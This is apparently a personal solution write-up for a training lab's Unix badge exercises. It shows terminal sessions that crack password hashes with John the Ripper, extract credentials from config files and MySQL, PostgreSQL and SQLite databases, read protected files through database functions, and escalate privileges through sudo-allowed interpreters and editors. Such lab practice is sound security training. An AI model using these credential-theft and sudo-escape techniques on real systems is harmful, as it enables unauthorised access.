# Unix badge

url:
https://pentesterlab.com/badges/unix

## unix 15
```bash
# localhost
~/tmp $ cat password.txt
victim:.KZvc9iQNfERE:18049:0:99999:7:::

~/tmp $ john password.txt --format=descrypt
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
victim15         (victim)

# Pentesterlab
victim@2fb2419a7083:~$ cat key.txt 
95729b33-fc12-4833-9ba1-eb89dc86293d
```

## unix 16
```bash
# localhost
~/tmp $ cat hash.txt
victim:$1$Q7ncB6rF$59kaRvdn0x6eUtrR65/NG0:18049:0:99999:7:::

~/tmp $ john hash.txt --format=md5crypt
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
victim12         (victim)

# pentesterlab
victim@176d1be0ba89:~$ cat key.txt 
d12e3ce8-31b1-453e-89a1-d22e63fab457
```

## unix 17
```bash
pentesterlab@cef721be5273:~$ find /etc/ -name tomcat-users.xml
/etc/tomcat7/tomcat-users.xml
pentesterlab@cef721be5273:~$ grep admin /etc/tomcat7/tomcat-users.xml 
  <user username="admin" password="b1f6d0b4-aba8-4741-8a98-35e48df8d4d1" roles="tomcat,admin"/>
```
## unix 18
```bash
pentesterlab@5b0305b39588:~$ mysql -u root
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| pentesterlab       |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)
mysql> use pentesterlab;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed
mysql> show tables;
+------------------------+
| Tables_in_pentesterlab |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)
mysql> select * from users;
+-------+--------------------------------------+
| login | password                             |
+-------+--------------------------------------+
| admin | 0cefcff1-b087-4710-95ee-92218b028cdf |
+-------+--------------------------------------+
1 row in set (0.00 sec)
mysql> 
```
## unix 19
```bash
# Same ex like before, the pass is an anagram of `root`
mysql> select * from logins;
+-------+--------------------------------------+
| login | password                             |
+-------+--------------------------------------+
| admin | 341d9c64-87ef-4a7b-a316-148be4644f61 |
+-------+--------------------------------------+
1 row in set (0.00 sec)<Paste>
```
## unix 20
```bash
# pentesterlab
mysql@8d447bd246a3:/var/lib/mysql/mysql$ strings /var/lib/mysql/mysql/user.MYD
        localhost
root*6C5083122F877455EF5E7B01
6c732c6044b7
root
        127.0.0.1
root
root
        localhost
debian-sys-maint*D1461CE757B9B67AC344204A3A7FE9F9DB17A35C
65C9098F15F0D511

# localhost
~/tmp $ john --help | grep sql
                          mssql mssql05 mssql12 mysql mysql-sha1
                          mysql-sha1-opencl mysqlna net-md5 net-sha1 nethalflm
~/tmp $ john hash.txt --format=mysql-sha1 --show
root:root1

# pentesterlab
mysql> select * from users;
+-------+--------------------------------------+
| login | password                             |
+-------+--------------------------------------+
| admin | 4a8205c8-cad8-4cc8-97e5-ed3be8ff204b |
+-------+--------------------------------------+
1 row in set (0.00 sec)
```
## unix 21
```bash
mysql> select load_file("/var/lib/mysql-files/key.txt");
+-------------------------------------------+
| load_file("/var/lib/mysql-files/key.txt") |
+-------------------------------------------+
| 4234db90-01c6-4f10-8c81-8c0017107fc7
     |
     +-------------------------------------------+
     1 row in set (0.00 sec)
     mysql> 
```
## unix 22
```bash
# pentesterlab
postgres=# \list
                               List of databases
     Name     |  Owner   | Encoding  | Collate | Ctype |   Access privileges   
--------------+----------+-----------+---------+-------+-----------------------
 pentesterlab | postgres | SQL_ASCII | C       | C     | 
 postgres     | postgres | SQL_ASCII | C       | C     | 
(4 rows)
postgres=# \c pentesterlab
You are now connected to database "pentesterlab" as user "postgres".
pentesterlab=# \d
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | users | table | postgres
(1 row)
pentesterlab=# select * from users;
 login |               password               
-------+--------------------------------------
 admin | c3a2fb1c-c0d9-418b-9e36-ed098ff6ee4b
(1 row)
```
## unix 23
```bash
# pentesterlab
pentesterlab@bb0af924810e:~$ grep  -Ri  password /var/www/* | grep photoblog
/var/www/classes/db.php:    $lnk = pg_connect("host=localhost port=5432 dbname=photoblog user=photoblog password=photoblog" );

pentesterlab@bb0af924810e:~$ psql -U photoblog 
Password for user photoblog: 

photoblog=# \list
                              List of databases
   Name    |  Owner   | Encoding  | Collate | Ctype |   Access privileges    
-----------+----------+-----------+---------+-------+------------------------
 photoblog | postgres | SQL_ASCII | C       | C     | =Tc/postgres          +
           |          |           |         |       | postgres=CTc/postgres +
           |          |           |         |       | photoblog=CTc/postgres
(4 rows)
photoblog=# \c photoblog
You are now connected to database "photoblog" as user "photoblog".
photoblog=# create table demo9(t text);
CREATE TABLE
photoblog=# copy demo9 from '/var/lib/postgresql/9.4/key.txt';
COPY 1
photoblog=# select * from demo9;
                  t                   
--------------------------------------
 25eb9d43-416e-4d3e-9dd3-a7a707380bdb
(1 row)
```
## unix 24
```bash
# pentesterlab
pentesterlab@51959c9472e4:~$ sqlite3 /tmp/database.db 
sqlite> .tables
users
sqlite> select * from users;
admin|3af54a55-f26d-409a-a7b3-aa14a4b3303c
```
## unix 25
```bash
# pentesterlab
pentesterlab@a18ca1c5f6cd:~$ sudo -l
    (victim) /bin/bash
pentesterlab@a18ca1c5f6cd:~$ sudo -u victim /bin/bash
victim@a18ca1c5f6cd:/home/pentesterlab$ ls ~/
key.txt
victim@a18ca1c5f6cd:/home/pentesterlab$ cat ~/key.txt 
b4842d63-c71c-4694-9b30-3b20aae22807
```
## unix 26
```bash
# pentesterlab
pentesterlab@6d162d7c67a9:~$ sudo -l
User pentesterlab may run the following commands on 6d162d7c67a9:
    (victim) /usr/bin/find
pentesterlab@6d162d7c67a9:~$ sudo -u victim /usr/bin/find /home/victim -name key.txt -exec cat {} \;
0d27fcdb-c2b9-4a79-8faa-c470cbea2fe8
```
## unix 27
```bash
# pentesterlab
# via sudo it can be seen that `victim` can run vim
26f56b7b-b751-4cdd-8210-c2298b2c0f27
```

## unix 28
```bash
# victim can run `/usr/bin/less` via sudo. So vim/less can open shells:
# vim: `:shell`
# less: `!/bin/bash`

ebd6927d-8097-46c0-98c9-ccd0049c30ab
```
## unix 29
```bash
# Gaining shell via `awk`:
awk 'BEGIN {system("/bin/bash")}'

pentesterlab@bed7bccc926b:~$ sudo -u victim /usr/bin/awk 'BEGIN{system("/bin/bash")}'
victim@bed7bccc926b:/home/pentesterlab$ cat ~/key.txt 
847fb3ee-877f-46b3-82a7-9deb4234ff96
```

## unix 30
```bash
# pentesterlab
pentesterlab@effb26db2333:~$ sudo -l
User pentesterlab may run the following commands on effb26db2333:
    (victim) /bin/chmod, /bin/cp

pentesterlab@effb26db2333:/tmp/ba$ cat copy.c 
int main(){
system("cat /home/victim/key.txt");
}

pentesterlab@effb26db2333:/tmp/ba$ gcc -o copy copy.c
pentesterlab@effb26db2333:/tmp/ba$ sudo -u victim /bin/cp copy /tmp/copy
pentesterlab@effb26db2333:/tmp/ba$ sudo -u victim /bin/chmod +xs /tmp/copy
pentesterlab@effb26db2333:/tmp/ba$ /tmp/copy
1340b7d2-76ce-49c0-9343-11cdf223b572


```

## unix 31
```bash
# pentesterlab

# spawn a shell in perl
perl â€”e 'exec "/bin/sh";'

pentesterlab@c46c78e0463e:~$ sudo -l
    (victim) /usr/bin/perl
pentesterlab@c46c78e0463e:~$ sudo -u victim /usr/bin/perl -e 'exec "/bin/bash"'
victim@c46c78e0463e:/home/pentesterlab$ cat ~/key.txt
19675da1-a2bf-4c7c-92e0-1202cf6e3f5c
```
## unix 32
```bash
# pentesterlab

# spawn a shell in python
python -c 'import pty; pty.spawn("/bin/sh")'

pentesterlab@3f77e6a1a926:~$ sudo -l
    (victim) /usr/bin/python
pentesterlab@3f77e6a1a926:~$ sudo -u victim /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
victim@3f77e6a1a926:/home/pentesterlab$ cat ~/key.txt
d134df68-e979-48a0-aa09-3ff6399c12b9


```
## unix 33
```bash
# pentesterlab

pentesterlab@e58cec392d20:~$ sudo -l
    (victim) /usr/bin/ruby

pentesterlab@e58cec392d20:~$ sudo -u victim /usr/bin/ruby -e 'system("cat /home/victim/key.txt")'
e4c59ad6-4be7-4bb1-934d-4d087084bed0
```
## unix 34
```bash
pentesterlab@2be6350f89b8:~$ sudo -l
    (victim) /usr/local/bin/node

pentesterlab@2be6350f89b8:/tmp/baz$ sudo -u victim /usr/local/bin/node -e 'var exec = require("child_process").exec; exec("cat 
/home/victim/key.txt", function (error, stdOut, stdErr) { console.log(stdOut); });'
43ee9b19-e6f2-4cfc-89cd-ce54dd148aff


```
